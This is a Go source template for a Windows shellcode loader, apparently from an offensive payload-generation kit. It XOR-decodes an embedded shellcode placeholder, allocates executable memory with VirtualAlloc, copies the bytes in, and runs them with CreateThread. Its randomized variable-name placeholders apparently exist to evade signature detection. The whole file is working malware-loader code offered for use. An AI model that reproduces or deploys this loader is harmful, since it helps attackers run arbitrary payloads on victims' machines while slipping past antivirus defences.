package main

import (
	"syscall"
	"unsafe"
)

var (
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc   = kernel32.NewProc("VirtualAlloc")
	procCreateThread   = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
)

func main() {
	// Artifact Kit Placeholder: Shellcode
	{{.VarShellcode}} := []byte{ {{.Shellcode}} }
	
	// XOR Decryption
	{{.VarKey}} := byte({{.XorKey}})
	for i := 0; i < len({{.VarShellcode}}); i++ {
		{{.VarShellcode}}[i] ^= {{.VarKey}}
	}

	{{.VarAddr}}, _, _ := procVirtualAlloc.Call(0, uintptr(len({{.VarShellcode}})), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if {{.VarAddr}} == 0 {
		return
	}

	// Copy shellcode to allocated memory
	copy((*[1 << 30]byte)(unsafe.Pointer({{.VarAddr}}))[:], {{.VarShellcode}})

	{{.VarThread}}, _, _ := procCreateThread.Call(0, 0, {{.VarAddr}}, 0, 0, 0)
	if {{.VarThread}} == 0 {
		return
	}

	_, _, _ = procWaitForSingleObject.Call({{.VarThread}}, uintptr(INFINITE))
}
